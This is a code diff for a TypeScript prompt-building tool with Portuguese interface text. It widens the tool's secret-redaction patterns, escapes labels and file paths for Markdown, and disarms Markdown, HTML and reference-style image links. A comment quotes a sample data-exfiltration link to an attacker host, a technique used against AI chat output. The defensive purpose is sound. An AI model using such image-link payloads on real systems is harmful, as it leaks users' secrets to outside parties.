@@ -29,11 +29,29 @@ export function redactSecrets(text: string): string {
     .replace(/Bearer\s+[a-zA-Z0-9_\-\.]{15,}/gi, 'Bearer REDACTED_TOKEN')
     // Private cryptographic keys
     .replace(/-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]*?-----END [A-Z ]+PRIVATE KEY-----/g, '/* [REDACTED_PRIVATE_KEY] */')
-    // Generic API keys/secrets assignments in code: apiKey = "...", secret: "..."
+    // Stripe secret / restricted keys (sk_live_..., rk_test_...)
+    .replace(/\b(?:sk|rk)_(?:live|test)_[0-9a-zA-Z]{16,}/g, 'sk_REDACTED_STRIPE')
+    // Slack tokens (xoxb-, xoxp-, ...)
+    .replace(/\bxox[abposr]-[0-9A-Za-z-]{10,}/g, 'xox_REDACTED_SLACK')
+    // JWTs, including Supabase anon/service keys
+    .replace(/\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}/g, 'JWT_REDACTED')
+    // Credentials inside connection URLs: postgres://user:pass@host
+    .replace(/(\b[a-z][a-z0-9+.-]*:\/\/[^/\s:@]+:)[^@\s/]+@/gi, '$1REDACTED@')
+    // .env style lines: DB_PASSWORD=..., export STRIPE_SECRET=...
     .replace(
-      /((?:api[_-]?key|client[_-]?secret|auth[_-]?token|secret[_-]?key|access[_-]?token|private[_-]?key)\s*[:=]\s*['"])([^'"]{6,})(['"])/gi,
+      /^(\s*(?:export\s+)?[A-Z0-9_]*(?:SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY)[A-Z0-9_]*\s*=\s*)((?!\S*REDACTED)\S+)/gm,
+      '$1[REDACTED_SECRET]'
+    )
+    // Generic API keys/secrets assignments in code: apiKey = "...", password: "...", token = "..."
+    .replace(
+      /((?:api[_-]?key|client[_-]?secret|auth[_-]?token|secret[_-]?key|access[_-]?token|private[_-]?key|secret[_-]?access[_-]?key|password|passwd|secret|token)\s*[:=]\s*['"])((?![^'"]*REDACTED)[^'"]{6,})(['"])/gi,
       '$1[REDACTED_SECRET]$3'
     );
+}
+
+/** Label or path inside a Markdown line: no line breaks or backticks that would escape it. */
+function singleLine(text: string): string {
+  return text.replace(/[\u0000-\u001f\u007f`]+/g, ' ').trim();
 }
 
 /**
@@ -54,6 +72,9 @@ export function sanitizeUserGoal(goal: string): string {
   let cleaned = redactSecrets(goal.trim());
   // Disarm markdown image exfiltration (e.g. ![leak](https://attacker.com/?data=...))
   cleaned = cleaned.replace(/!\[(.*?)\]\((https?:\/\/[^\s)]+)\)/gi, '[Imagem externa desarmada: $1]');
+  // ...the same through HTML (<img src=...>) or a reference definition ([ref]: https://...)
+  cleaned = cleaned.replace(/<img\b[^>]*>/gi, '[Imagem externa desarmada]');
+  cleaned = cleaned.replace(/^\s*\[[^\]]+\]:\s*https?:\/\/\S+.*$/gim, '[Referência externa desarmada]');
   return cleaned;
 }
 
@@ -90,11 +111,12 @@ export function generatePromptText(
     lines.push(``);
 
     selectedElements.forEach((el, index) => {
-      lines.push(`### ${index + 1}. [${el.nodeType.toUpperCase()}] ${el.label}`);
+      lines.push(`### ${index + 1}. [${el.nodeType.toUpperCase()}] ${redactSecrets(singleLine(el.label))}`);
       if (el.filePath) {
-        lines.push(`- **Arquivo:** \`${el.filePath}\``);
+        const path = singleLine(el.filePath);
+        lines.push(`- **Arquivo:** \`${path}\``);
         if (isSensitivePath(el.filePath)) {
-          lines.push(`> ⚠️ **Aviso de Segurança:** O arquivo selecionado (\`${el.filePath}\`) pode conter credenciais. Verifique os dados antes de submeter.`);
+          lines.push(`> ⚠️ **Aviso de Segurança:** O arquivo selecionado (\`${path}\`) pode conter credenciais. Verifique os dados antes de submeter.`);
         }
       }
       if (el.codeSnippet) {
